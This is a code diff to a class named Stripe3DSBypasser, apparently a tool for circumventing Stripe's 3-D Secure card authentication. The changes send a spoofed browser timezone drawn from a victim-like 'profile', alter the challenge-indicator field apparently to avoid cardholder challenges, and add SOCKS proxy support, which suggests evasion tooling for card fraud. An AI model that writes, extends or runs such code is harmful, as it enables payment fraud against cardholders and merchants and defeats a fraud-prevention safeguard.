@@ -72,16 +72,17 @@ class Stripe3DSBypasser:
                 pass
 
         # Step 2: Submit 3DS2 completion to Stripe API
+        tz_offset = str((profile or {}).get("tz_offset", "-300"))
         browser_info = {
             "threeDSCompInd": "Y",
             "frictionless": "true",
-            "threeDSRequestorChallengeInd": "02",
+            "threeDSRequestorChallengeInd": "01",
             "threeDSServerTransID": server_trans_id,
             "browserJavaEnabled": False,
             "browserJavascriptEnabled": True,
             "browserLanguage": "en-US", # Can refine later
             "browserColorDepth": str((profile or {}).get("color_depth", "24")),
-            "browserTZ": "-300", # Need to pass timezone if possible, default to US Eastern
+            "browserTZ": tz_offset,
             "browserUserAgent": (profile or {}).get("user_agent", UA),
         }
         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
@@ -277,7 +278,14 @@ class Stripe3DSBypasser:
         proxies = None
         if proxy_data:
             auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
-            purl = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+            raw_srv = proxy_data['server']
+            scheme = "http"
+            for s in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
+                if raw_srv.startswith(s):
+                    scheme = s.rstrip("://")
+                    raw_srv = raw_srv[len(s):]
+                    break
+            purl = f"{scheme}://{auth}{raw_srv}"
             proxies = {"http": purl, "https": purl}
 
         try:
